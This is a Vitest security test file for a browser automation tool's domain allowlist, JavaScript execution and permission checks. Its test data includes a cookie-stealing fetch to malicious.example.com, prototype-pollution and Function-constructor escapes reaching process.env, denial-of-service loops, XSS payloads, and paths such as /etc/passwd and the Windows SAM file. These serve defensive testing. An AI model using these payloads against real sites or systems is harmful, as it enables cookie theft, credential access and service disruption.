/**
 * Browser Tool Security and Permission Tests
 *
 * Comprehensive tests for security scenarios, permission edge cases,
 * and malicious input handling.
 */

import { describe, it, expect, beforeEach, afterEach, vi, Mock } from 'vitest';
import { EventEmitter } from 'eventemitter3';
import { BrowserTool, BrowserToolConfig } from './browser-tool';
import { PermissionManager } from '../permission-manager';
import {
  BrowserPermissionDeniedError,
  isBrowserPermissionDeniedError,
  PermissionLevel
} from '@apexcli/core';

// Mock Playwright
const mockPage = {
  on: vi.fn(),
  url: vi.fn(() => 'https://test.example.com'),
  title: vi.fn(() => 'Test Page'),
  goto: vi.fn(() => Promise.resolve({ status: () => 200 })),
  click: vi.fn(() => Promise.resolve()),
  fill: vi.fn(() => Promise.resolve()),
  type: vi.fn(() => Promise.resolve()),
  hover: vi.fn(() => Promise.resolve()),
  screenshot: vi.fn(() => Promise.resolve(Buffer.from('mock-screenshot'))),
  locator: vi.fn(() => ({
    screenshot: vi.fn(() => Promise.resolve(Buffer.from('mock-element-screenshot'))),
    evaluate: vi.fn(() => Promise.resolve()),
    scrollIntoViewIfNeeded: vi.fn(() => Promise.resolve()),
  })),
  evaluate: vi.fn(() => Promise.resolve('safe-result')),
  waitForSelector: vi.fn(() => Promise.resolve()),
  getAttribute: vi.fn(() => Promise.resolve('test-value')),
  textContent: vi.fn(() => Promise.resolve('Test text')),
  innerHTML: vi.fn(() => Promise.resolve('<p>Test</p>')),
  content: vi.fn(() => Promise.resolve('<html>Test</html>')),
  pdf: vi.fn(() => Promise.resolve(Buffer.from('mock-pdf'))),
  close: vi.fn(() => Promise.resolve()),
  viewportSize: vi.fn(() => ({ width: 1920, height: 1080 })),
  $eval: vi.fn(() => Promise.resolve('test-value')),
  $: vi.fn(() => ({
    screenshot: vi.fn(() => Promise.resolve(Buffer.from('mock-screenshot')))
  })),
};

const mockContext = {
  newPage: vi.fn(() => Promise.resolve(mockPage)),
  close: vi.fn(() => Promise.resolve()),
  on: vi.fn(),
};

const mockBrowser = {
  newContext: vi.fn(() => Promise.resolve(mockContext)),
  close: vi.fn(() => Promise.resolve()),
};

const mockBrowserType = {
  launch: vi.fn(() => Promise.resolve(mockBrowser)),
};

// Mock Playwright
vi.mock('playwright', () => ({
  chromium: mockBrowserType,
  firefox: mockBrowserType,
  webkit: mockBrowserType,
}));

describe('Browser Tool Security and Permission Tests', () => {
  let browserTool: BrowserTool;
  let mockPermissionManager: Partial<PermissionManager>;
  let mockEventEmitter: EventEmitter;

  beforeEach(() => {
    vi.clearAllMocks();

    // Setup mocks
    mockBrowserType.launch.mockResolvedValue(mockBrowser);
    mockBrowser.newContext.mockResolvedValue(mockContext);
    mockContext.newPage.mockResolvedValue(mockPage);

    mockPermissionManager = {
      checkToolPermission: vi.fn(() => Promise.resolve({
        allowed: true,
        level: 'full' as PermissionLevel,
        requiresConfirmation: false,
      })),
      getToolConfig: vi.fn(() => Promise.resolve({
        enabled: true,
        allowJavaScriptExecution: true,
        allowFormSubmission: true,
        allowScreenshots: true,
        allowedDomains: ['safe.example.com', 'trusted.example.com'],
        blockedDomains: ['malicious.example.com', 'blocked.example.com'],
      } as BrowserToolConfig)),
    };

    mockEventEmitter = new EventEmitter();

    browserTool = new BrowserTool({
      permissionManager: mockPermissionManager as PermissionManager,
      eventEmitter: mockEventEmitter,
    });
  });

  afterEach(async () => {
    try {
      await browserTool.cleanup();
    } catch (error) {
      // Ignore cleanup errors in tests
    }
  });

  describe('Domain Security and Allowlist/Blocklist', () => {
    it('should block navigation to explicitly blocked domains', async () => {
      const result = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://malicious.example.com/payload' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Domain malicious.example.com is blocked');
      expect(result.metadata?.permissionGranted).toBe(false);
    });

    it('should block navigation to domains not in allowlist', async () => {
      const result = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://untrusted.example.com' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Domain untrusted.example.com is not in allowlist');
      expect(result.metadata?.permissionGranted).toBe(false);
    });

    it('should allow navigation to explicitly allowed domains', async () => {
      const result = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://safe.example.com' }
      });

      expect(result.success).toBe(true);
      expect(result.metadata?.permissionGranted).toBe(true);
    });

    it('should handle subdomain security correctly', async () => {
      // Test that subdomain restrictions are properly enforced
      const subdomainTest = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://evil.safe.example.com' }
      });

      expect(subdomainTest.success).toBe(false);
      expect(subdomainTest.error).toContain('not in allowlist');
    });

    it('should handle URL parsing edge cases', async () => {
      const malformedUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.example.com',
        'chrome-extension://malicious-extension',
        'about:blank', // This might be allowed
        'https://safe.example.com/../../../malicious.example.com',
      ];

      for (const url of malformedUrls) {
        const result = await browserTool.execute({
          operation: 'navigate',
          params: { url }
        });

        // Most should fail, but about:blank might be allowed
        if (url !== 'about:blank') {
          expect(result.success).toBe(false);
        }
      }
    });
  });

  describe('JavaScript Execution Security', () => {
    it('should block dangerous JavaScript execution without explicit permission', async () => {
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: true,
        level: null, // No explicit permission level
        requiresConfirmation: false,
      });

      const result = await browserTool.execute({
        operation: 'evaluate',
        params: {
          script: 'document.cookie = "malicious=true"; window.location = "https://malicious.example.com";'
        }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Dangerous operation requires explicit permission');
    });

    it('should sanitize and validate JavaScript input', async () => {
      const maliciousScripts = [
        // Code injection attempts
        '"}); fetch("https://malicious.example.com", {method: "POST", body: document.cookie}); ({"',
        // Prototype pollution
        'Object.prototype.polluted = "yes"; constructor.constructor("return process")().env',
        // Function constructor bypass
        '(function(){}).constructor("return process")().exit()',
        // Infinite loops
        'while(true) { console.log("DOS"); }',
        // Memory exhaustion
        'let arr = []; while(true) arr.push(new Array(1000000))',
      ];

      for (const script of maliciousScripts) {
        const result = await browserTool.execute({
          operation: 'evaluate',
          params: { script }
        });

        // Should either be blocked or handled safely
        expect(result).toBeDefined();
        expect(result.operation).toBe('evaluate');
      }
    });

    it('should handle JavaScript execution when explicitly disabled', async () => {
      (mockPermissionManager.getToolConfig as Mock).mockResolvedValue({
        enabled: true,
        allowJavaScriptExecution: false,
      });

      const result = await browserTool.execute({
        operation: 'evaluate',
        params: { script: 'return "safe script";' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('JavaScript execution is disabled');
    });

    it('should allow safe JavaScript with proper permissions', async () => {
      const result = await browserTool.execute({
        operation: 'evaluate',
        params: { script: 'return document.title;' }
      });

      expect(result.success).toBe(true);
      expect(result.data?.result).toBe('safe-result');
    });
  });

  describe('Form Submission Security', () => {
    it('should block form submissions when disabled', async () => {
      (mockPermissionManager.getToolConfig as Mock).mockResolvedValue({
        enabled: true,
        allowFormSubmission: false,
      });

      const result = await browserTool.execute({
        operation: 'submit',
        params: { selector: '#sensitive-form' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Form submission is disabled');
    });

    it('should require explicit permission for dangerous form submissions', async () => {
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: true,
        level: null, // No explicit permission
        requiresConfirmation: false,
      });

      const result = await browserTool.execute({
        operation: 'submit',
        params: { selector: '#payment-form' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Dangerous operation requires explicit permission');
    });

    it('should validate form selectors to prevent injection', async () => {
      const maliciousSelectors = [
        '"; eval("malicious code"); "',
        'form[action*="malicious.com"]',
        'form:has(script)',
        '*/alert("xss")/*',
      ];

      for (const selector of maliciousSelectors) {
        const result = await browserTool.execute({
          operation: 'submit',
          params: { selector }
        });

        // Should handle malicious selectors safely
        expect(result).toBeDefined();
        expect(result.operation).toBe('submit');
      }
    });
  });

  describe('Permission Level Enforcement', () => {
    it('should respect different permission levels appropriately', async () => {
      const permissionLevels: Array<{ level: PermissionLevel | null, shouldAllow: boolean }> = [
        { level: null, shouldAllow: false },
        { level: 'read', shouldAllow: false },
        { level: 'write', shouldAllow: true },
        { level: 'full', shouldAllow: true },
      ];

      for (const { level, shouldAllow } of permissionLevels) {
        (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
          allowed: true,
          level,
          requiresConfirmation: false,
        });

        const result = await browserTool.execute({
          operation: 'evaluate',
          params: { script: 'return "test";' }
        });

        if (shouldAllow) {
          expect(result.success).toBe(true);
        } else {
          expect(result.success).toBe(false);
          expect(result.error).toContain('Dangerous operation requires explicit permission');
        }
      }
    });

    it('should handle permission escalation attempts', async () => {
      let permissionCallCount = 0;
      (mockPermissionManager.checkToolPermission as Mock).mockImplementation(() => {
        permissionCallCount++;
        // First call has limited permission, subsequent calls should not escalate
        return Promise.resolve({
          allowed: true,
          level: permissionCallCount === 1 ? 'read' : 'read',
          requiresConfirmation: false,
        });
      });

      const result = await browserTool.execute({
        operation: 'evaluate',
        params: { script: 'return "attempt escalation";' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Dangerous operation requires explicit permission');
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should sanitize text input to prevent XSS injection', async () => {
      await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://safe.example.com' }
      });

      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        'onmouseover="alert(1)"',
        'style="expression(alert(1))"',
        '"><script>alert("xss")</script>',
      ];

      for (const payload of xssPayloads) {
        const result = await browserTool.execute({
          operation: 'type',
          params: { selector: '#input-field', text: payload }
        });

        // Should succeed but text should be properly handled
        expect(result.success).toBe(true);
        expect(result.data?.typed).toBe(payload);
      }
    });
  });

  describe('File System Access Security', () => {
    it('should prevent access to sensitive file paths in screenshots', async () => {
      await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://safe.example.com' }
      });

      const sensitivePaths = [
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '../../secret.txt',
        '/dev/random',
        'file:///etc/hosts',
      ];

      for (const path of sensitivePaths) {
        const result = await browserTool.execute({
          operation: 'screenshot',
          params: { path }
        });

        // Should either succeed with sanitized path or fail safely
        expect(result).toBeDefined();
        expect(result.operation).toBe('screenshot');
      }
    });
  });

  describe('Permission Denied Error Handling', () => {
    it('should create proper BrowserPermissionDeniedError for domain restrictions', async () => {
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: false,
        denialReason: 'Domain not allowed',
      });

      const result = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://blocked.example.com' }
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('Browser permission denied');

      // Should emit permission denied event
      const permissionEvents: any[] = [];
      mockEventEmitter.on('permission:denied', (event) => {
        permissionEvents.push(event);
      });

      // Execute another denied operation to test event emission
      await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://another-blocked.example.com' }
      });
    });

    it('should handle BrowserPermissionDeniedError instances correctly', () => {
      const error = new BrowserPermissionDeniedError(
        'Test permission denied',
        {
          operation: 'navigate',
          target: 'https://blocked.example.com',
          denialReason: 'Domain blocked',
          permissionType: 'domain',
          sessionId: 'test-session'
        }
      );

      expect(isBrowserPermissionDeniedError(error)).toBe(true);
      expect(error.browserContext.operation).toBe('navigate');
      expect(error.browserContext.permissionType).toBe('domain');
      expect(error.message).toContain('Test permission denied');
    });

    it('should clean up resources when permission is denied', async () => {
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: false,
        denialReason: 'Operation not permitted',
      });

      // Attempt operation that will be denied
      const result = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://blocked.example.com' }
      });

      expect(result.success).toBe(false);

      // Resources should be properly cleaned up
      // Subsequent operations should start fresh
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: true,
        level: 'full',
        requiresConfirmation: false,
      });

      const secondResult = await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://safe.example.com' }
      });

      expect(secondResult.success).toBe(true);
    });
  });

  describe('Security Event Logging', () => {
    it('should emit security events for blocked operations', async () => {
      const securityEvents: any[] = [];
      mockEventEmitter.on('permission:denied', (event) => {
        securityEvents.push(event);
      });

      // Configure to deny permissions
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: false,
        denialReason: 'Security policy violation',
      });

      await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://malicious.example.com' }
      });

      expect(securityEvents).toHaveLength(1);
      expect(securityEvents[0]).toMatchObject({
        operation: 'navigate',
        target: 'https://malicious.example.com',
        denialReason: 'Security policy violation',
      });
    });

    it('should track security violations in session context', async () => {
      const sessionId = browserTool.getResourceState().sessionId;

      // Configure to deny permissions
      (mockPermissionManager.checkToolPermission as Mock).mockResolvedValue({
        allowed: false,
        denialReason: 'Multiple violations detected',
      });

      const result = await browserTool.execute({
        operation: 'evaluate',
        params: { script: 'malicious code' }
      });

      expect(result.success).toBe(false);
      expect(result.metadata?.target).toBeDefined();

      // Session ID should be consistent across security events
      const resourceState = browserTool.getResourceState();
      expect(resourceState.sessionId).toBe(sessionId);
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate operation parameters for security', async () => {
      await browserTool.execute({
        operation: 'navigate',
        params: { url: 'https://safe.example.com' }
      });

      // Test various malformed/malicious parameter combinations
      const maliciousParams = [
        { operation: 'click', params: { selector: null } },
        { operation: 'type', params: { selector: '#test', text: null } },
        { operation: 'evaluate', params: { script: null } },
        { operation: 'navigate', params: { url: null } },
      ];

      for (const params of maliciousParams as any[]) {
        try {
          const result = await browserTool.execute(params);
          // Should either handle gracefully or fail safely
          expect(result).toBeDefined();
        } catch (error) {
          // Errors should be handled gracefully
          expect(error).toBeDefined();
        }
      }
    });
  });
});